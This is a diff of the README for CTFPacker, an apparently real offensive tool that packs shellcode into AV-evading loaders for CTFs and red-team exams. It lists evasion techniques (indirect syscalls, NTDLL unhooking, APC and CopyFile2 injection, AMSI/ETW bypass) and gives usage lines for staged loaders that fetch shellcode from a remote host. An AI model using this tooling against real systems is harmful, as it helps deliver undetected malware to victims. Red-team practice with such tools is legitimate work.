@@ -1,17 +1,6 @@
 # CTFPacker
 
-```
- ▄████▄  ▄▄▄█████▓  █████▒██▓███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███  
-▒██▀ ▀█  ▓  ██▒ ▓▒▓██   ▒▓██░  ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
-▒▓█    ▄ ▒ ▓██░ ▒░▒████ ░▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
-▒▓▓▄ ▄██▒░ ▓██▓ ░ ░▓█▒  ░▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
-▒ ▓███▀ ░  ▒██▒ ░ ░▒█░   ▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
-░ ░▒ ▒  ░  ▒ ░░    ▒ ░   ▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
-  ░  ▒       ░     ░     ░▒ ░       ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
-░          ░       ░ ░   ░░         ░   ▒   ░        ░ ░░ ░    ░     ░░   ░ 
-░ ░                                     ░  ░░ ░      ░  ░      ░  ░   ░     
-░                                           ░                               
-```
+![CTFPacker](assets/Full-Logo-red-black.svg)
 
 > [!TIP]
 > Did CTFPacker help you with a penetration test engagement or in passing a certification exam? If so, please consider giving it a star ⭐! Your support would greatly help the project and motivate me to add more features or even rework it entirely into a much more capable packer!
@@ -23,8 +12,8 @@
   * [General Information](#general-information)
   * [Evasion Features](#evasion-features)
   * [Installation](#installation)
-    + [Makefile](#makefile)
   * [Usage](#usage)
+    + [GUI](#gui)
     + [Format option](#format-option)
     + [Staged](#staged)
     + [Stageless](#stageless)
@@ -37,7 +26,7 @@
 
 This repository has been created to facilitate AV evasion during CTFs and/or pentest & red team exams. The goal is to focus more on pwning rather than struggeling with evasion !
 
-Check out my blog post for more infos: [Evade Modern AVs in 2025](https://mochabyte.xyz/posts/Evade-Modern-AVs-in-2025/)
+Check out my blog post for more infos: [Evade Modern AVs in 2025](https://mochabyte.xyz/2025/06/11/evade-modern-avs-in-2025/)
 
 ## General Information
 
@@ -51,109 +40,39 @@ Check out my blog post for more infos: [Evade Modern AVs in 2025](https://mochab
 
 ## Evasion Features
 
-- Indirect Syscalls via Syswhispers (rewrote in NASM compatible assembly)
+- Indirect Syscalls via **Hell's Hall** (PEB walk + CRC32b hashing, obfuscated NASM stub with XOR encoding & junk ops)
 - API Hashing
 - NTDLL unhooking via Known DLLs technique
 - Custom GetProcAddr & GetModuleHandle functions
 - Custom AES-128-CBC mode encryption & decryption
-- EarlyBird APC Injection
-- Possiblity to choose between staged or stageless loader
+- EarlyBird APC Injection or CopyFile2 progress callback execution 
+- Possibility to choose between staged or stageless loader
 - "Polymorphic" behavior with the `-s` argument
+- Entropy reduction via embedded English text padding (`-er`)
+- Optional HTTPS transport for staged payloads
 
 ## Installation
 
-Depending on your OS, the installation will slightly differ. In general, make sure you have the following stuff installed:
-
-- CLANG compiler
-- MinGW-w64 Toolchain
-- Make
-
-If I am not mistaken, those are by default installed on KALI Linux. However, if you want to install them manually, this should do the trick:
+Make sure you have the following dependencies installed first:
 
 ```bash
-# Assuming Debian based system
+# Assuming Debian based system (those are usually already on Kali)
 sudo apt update
 sudo apt install clang pipx mingw-w64 make lld nasm osslsigncode
-
-# Verify installation
-clang --version
-make --version
-
-# or
-clang -v
-
-# If this is the case, refer to the chapter "Makefile" to replace the compiler in the Makefile of the templates
 ```
 
-It's a bit of a different story on Windows. You need to install the MinGW-w64 toolchain by installing MSYS2 first.
+Then just run the install script:
 
-```powershell
-# Go there and install this
-https://www.msys2.org/
-
-# Then
-pacman -Syu
-pacman -S mingw-w64-x86_64-clang
-
-# Veryify installation
-x86_64-w64-mingw32-clang --version
-
-# Install make
-pacman -S make
-
-# Verify installation
-make --version
-```
-
-You should also check under `C:\msys64\mingw64\bin`. This is a common place where the toolchain is being installed.
-
-After the basis installation, don't forget to install the python requirements ! Otherwise the packer will not work :D !
-
-**Linux**:
 ```bash
-# Via pipx (preferred way)
 cd CTFPacker
-python3 -m pipx install .
-# You can use ctfpacker globaly now
+sudo bash install.sh
 
-# Via manual virtual environment
-cd CTFPacker
-python3 -m venv env
-source env/bin/activate
-python3 -m pip install .
-
-# Once you're done using the tool
-deactivate
-
-# Old fashion
-cd CTFPacker
-python3 -m pip install -r requirements.txt --break-system-packages
-python3 main.py -h
-```
-**Windows**:
-```powershell
-# Via pip
-cd CTFPacker
-python3 -m pip install .
-
-# Done ! :)
+# To remove it
+sudo bash uninstall.sh
 ```
 
-### Makefile
+That's it ! This will install the python package via pipx, set up a `.desktop` launcher and copy the logo to `~/.local/share/icons/`. You can now use `ctfpacker` and `ctfpacker-gui` globally.
 
-You should NOT modify the Makefile unless you know what you are doing ! BUT, there's one thing you should check BEFORE the python installation process. The first line of the Makefile indicates your compiler. Verify if the compiler matches with the one you installed earlier on your system. You can refer to the appropriate Makefile (windows / linux) in this repo.
-
-```makefile
-# Verify this line
-CLANG    := clang
-```
-
-Replace it with the appropriate CLANG compiler
-
-```makefile
-# Example
-CLANG    := x86_64-w64-mingw32-clang
-```
 
 ## Usage
 
@@ -175,50 +94,76 @@ options:
 Staged:
 
 ```
-usage: main.py staged [-h] -p PAYLOAD [-f {EXE,DLL}] -i IP_ADDRESS -po PORT -pa PATH [-o OUTPUT] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]
+usage: main.py staged [-h] -p PAYLOAD [-f {EXE,DLL}] [-apc {RuntimeBroker.exe,svchost.exe}]
+                      [-inj {apc,copyfile2}] -i IP_ADDRESS -po PORT -pa PATH [-o OUTPUT]
+                      [--https] [--user-agent USER_AGENT] [-e] [-s] [-er]
+                      [-pfx PFX] [-pfx-pass PFX_PASSWORD]
 
 options:
-  -h, --help            show this help message and exit
+  -h, --help                    show this help message and exit
   -p PAYLOAD, --payload PAYLOAD
-                        Shellcode to be packed
+                                Shellcode to be packed
   -f {EXE,DLL}, --format {EXE,DLL}
-                        Format of the output file (default: EXE).
+                                Format of the output file (default: EXE).
+  -apc {RuntimeBroker.exe,svchost.exe}
+                                Target injection process (default: RuntimeBroker.exe).
+  -inj {apc,copyfile2}, --inject-method {apc,copyfile2}
+                                Injection method: 'apc' for EarlyBird APC or 'copyfile2' for
+                                CopyFile2 progress callback execution (default: apc).
   -i IP_ADDRESS, --ip-address IP_ADDRESS
-                        IP address from where your shellcode is gonna be fetched.
-  -po PORT, --port PORT
-                        Port from where the HTTP connection is gonna fetch your shellcode.
-  -pa PATH, --path PATH
-                        Path from where your shellcode uis gonna be fetched.
-  -o OUTPUT, --output OUTPUT
-                        Output path where the shellcode is gonna be saved.
-  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
-  -s, --scramble        Scramble the loader's functions and variables.
-  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
+                                IP address from where your shellcode is gonna be fetched.
+  -po PORT, --port PORT         Port from where the HTTP connection is gonna fetch your shellcode.
+  -pa PATH, --path PATH         Path from where your shellcode is gonna be fetched.
+  -o OUTPUT, --output OUTPUT    Output path where the loader is gonna be saved.
+  --https                       Use HTTPS instead of HTTP for downloading the shellcode.
+  --user-agent USER_AGENT       Custom User-Agent string for HTTP/HTTPS requests.
+  -e, --encrypt                 Encrypt the shellcode via AES-128-CBC.
+  -s, --scramble                Scramble the loader's functions and variables.
+  -er, --entropy-reduction      Reduce binary entropy by embedding English text padding.
+  -pfx PFX, --pfx PFX           Path to the PFX file for signing the loader.
   -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
-                        Password for the PFX file.
+                                Password for the PFX file.
 
-Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
+Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -inj apc -e -s --https -pfx cert.pfx -pfx-pass 'password'
 ```
 
 Stageless:
 
 ```
-usage: main.py stageless [-h] -p PAYLOAD [-f {EXE,DLL}] [-e] [-s] [-pfx PFX] [-pfx-pass PFX_PASSWORD]
+usage: main.py stageless [-h] -p PAYLOAD [-f {EXE,DLL}] [-apc {RuntimeBroker.exe,svchost.exe}]
+                         [-inj {apc,copyfile2}] [-e] [-s] [-er]
+                         [-pfx PFX] [-pfx-pass PFX_PASSWORD]
 
 options:
-  -h, --help            show this help message and exit
+  -h, --help                    show this help message and exit
   -p PAYLOAD, --payload PAYLOAD
-                        Shellcode to be packed
+                                Shellcode to be packed
   -f {EXE,DLL}, --format {EXE,DLL}
-                        Format of the output file (default: EXE).
-  -e, --encrypt         Encrypt the shellcode via AES-128-CBC.
-  -s, --scramble        Scramble the loader's functions and variables.
-  -pfx PFX, --pfx PFX   Path to the PFX file for signing the loader.
+                                Format of the output file (default: EXE).
+  -apc {RuntimeBroker.exe,svchost.exe}
+                                Target injection process (default: RuntimeBroker.exe).
+  -inj {apc,copyfile2}, --inject-method {apc,copyfile2}
+                                Injection method: 'apc' for EarlyBird APC or 'copyfile2' for
+                                CopyFile2 progress callback execution (default: apc).
+  -e, --encrypt                 Encrypt the shellcode via AES-128-CBC.
+  -s, --scramble                Scramble the loader's functions and variables.
+  -er, --entropy-reduction      Reduce binary entropy by embedding English text padding.
+  -pfx PFX, --pfx PFX           Path to the PFX file for signing the loader.
   -pfx-pass PFX_PASSWORD, --pfx-password PFX_PASSWORD
-                        Password for the PFX file.
+                                Password for the PFX file.
 
-Example usage: python main.py stageless -p shellcode.bin -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'
+Example usage: python main.py stageless -p shellcode.bin -e -s -inj copyfile2 -pfx cert.pfx -pfx-pass 'password'
 ```
+
+### GUI
+
+If you installed via pipx or `install.sh`, you can launch the GUI directly:
+
+```bash
+ctfpacker-gui
+```
+
+The GUI exposes all the same options as the CLI but with real-time build output, a log panel, and a profile system. You can save/load build configurations as named profiles, and export/import them as `.ctfp` files to share across machines.
 
 ### Format option
 
@@ -352,8 +297,10 @@ https://github.com/user-attachments/assets/4aa56672-bcfb-424b-aa89-a919b514ae35
 ## To-Do
 
 - [x] Maybe adding a setup.py file to install via pip / pipx
-- [ ] Other templates with different injection techniques
-- [ ] Adding AMSI / ETW bypass (depends on what injection technique I am going to put here)
+- [x] Other templates with different injection techniques (added CopyFile2 progress callback)
+- [x] PyQt6 GUI with build profiles & real-time output
+- [x] Adding AMSI / ETW bypass (depends on what injection technique I am going to put here)
+- [ ] More injection techniques
 
 ## Detections
 
@@ -368,9 +315,9 @@ https://github.com/user-attachments/assets/4aa56672-bcfb-424b-aa89-a919b514ae35
 Most of the code is not from me. Here are the original authors:
 
 ```
-@ Maldevacademy     - https://maldevacademy.com
+@ Maldevacademy     - https://maldevacademy.com ; https://github.com/Maldev-Academy/HellHall
+@ trickster0        - https://github.com/trickster0/TartarusGate  (indirect syscalls)
 @ SaadAhla          - https://github.com/SaadAhla/ntdlll-unhooking-collection
 @ VX-Underground    - https://github.com/vxunderground/VX-API/blob/main/VX-API/GetProcAddressDjb2.cpp
-@ klezVirus         - https://github.com/klezVirus/SysWhispers3
 ```
 
